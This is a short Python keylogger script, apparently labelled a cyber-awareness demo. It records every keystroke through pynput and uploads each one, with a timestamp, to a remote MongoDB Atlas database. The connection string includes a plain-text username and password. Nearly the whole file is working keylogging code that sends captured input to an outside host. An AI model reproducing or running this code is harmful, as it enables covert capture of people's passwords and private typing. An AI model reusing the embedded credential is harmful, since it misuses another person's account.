from pynput import keyboard
from pymongo import MongoClient
from datetime import datetime

# MongoDB connection
client = MongoClient("mongodb+srv://zkaynl7:nicklemy2005@nicklemy.xqj4h.mongodb.net/?retryWrites=true&w=majority&appName=nicklemy")
db = client["cyber_awareness_demo"]
collection = db["keystrokes"]

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)  # Special keys like space, enter

    log = {
        "key": key_str,
        "timestamp": datetime.utcnow()
    }

    # Insert into MongoDB
    collection.insert_one(log)
    print(f"Logged: {key_str}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

